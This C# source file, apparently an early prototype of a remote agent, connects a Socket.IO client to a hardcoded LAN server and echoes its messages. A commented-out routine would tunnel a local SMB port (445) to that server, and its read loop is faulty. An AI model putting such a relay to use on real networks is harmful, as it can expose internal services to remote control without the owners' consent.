using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SocketIOClient;
using System.Net;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Management;
// TODO: Remove uneccesary imports


namespace TcpProxy
{
    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length > 1)
            {
                Go(args[0]);
            }
            else
            {
                Go();
            }
            while (true) { };
        }
        static async void Go(string home = "http://192.168.1.103:8888/")
        {
            // create new socket.io client
            var client = new SocketIO(home);

            // register all of the commands
            // Client echo
            client.On("echo", response =>
            {
                // Echo service
                Console.WriteLine(response.ToString());
                client.EmitAsync("echo", response.ToString());

            });

            /*
            Console.WriteLine("Starting relay");
            relay();
            Console.WriteLine("Moving past relay");

            async void relay(string host = "127.0.0.1", int port = 445)
            {
                using (TcpClient tcpClient = new TcpClient(host, port))
                {
                    NetworkStream networkStream = tcpClient.GetStream();
                    networkStream.ReadTimeout = 2000;

                    // recv from SocketIO, send to TCP socket
                    client.On("echo", response =>
                    {
                        foreach (var b in response.ToString())
                        {
                            networkStream.WriteByte((byte)b);
                        }
                        networkStream.Flush();
                    });


                    // recv from TCP socket, send to SocketIO
                    bool connected = true; // This value should be able to be changed based on EITHER end of the pipe
                    while (connected)
                    {
                        byte[] buffer = new byte[1024];
                        int count = 0;
                        if (networkStream.DataAvailable && count < 1024)
                        {
                            buffer[count] = (byte)networkStream.ReadByte();
                            count++;
                        }
                        if(count != 0)
                        {
                            await client.EmitAsync("echo", Convert.ToBase64String(buffer));
                        }
                        
                    }
                }
        
            }
            */

            // finally, connect to the server and start the party
            await client.ConnectAsync();
        }

    }
}

